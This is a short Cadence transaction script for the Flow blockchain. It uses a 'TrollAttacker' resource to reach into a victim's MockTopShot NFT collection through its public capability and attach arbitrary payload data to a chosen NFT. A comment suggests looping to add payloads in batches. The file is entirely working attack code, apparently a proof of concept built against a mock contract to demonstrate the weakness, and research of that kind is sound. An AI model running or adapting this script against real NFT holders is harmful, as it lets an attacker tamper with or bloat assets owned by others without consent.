import NonFungibleToken from "../contracts/utility/NonFungibleToken.cdc"
import MockTopShot from "../contracts/MockTopShot.cdc"
import TrollAttacker from "../contracts/TrollAttacker.cdc"

transaction(victimAddress: Address, nftID: UInt64, payload: String) {
    
    let nftRef: &MockTopShot.NFT
    let trollRef: &TrollAttacker.Troll
    
    prepare(signer: AuthAccount) {
        // Get troll
        self.trollRef = signer.borrow<&TrollAttacker.Troll>(from: TrollAttacker.TrollStoragePath) ?? panic("You're not the troll!")
        // Get target
        let collectionRef = getAccount(victimAddress).getCapability<
                &MockTopShot.Collection{MockTopShot.CollectionPublic}
            >(
                MockTopShot.CollectionPublicPath
            ).borrow()
            ?? panic("No CollectionPublic found!")
        self.nftRef = collectionRef.borrowMockTopShot(id: nftID) ?? panic("No NFT with given ID!")
    }

    execute {
        // Could also loop to add a bunch of payloads in batches
        self.trollRef.addData(toNFT: self.nftRef, payload: payload)
    }
}
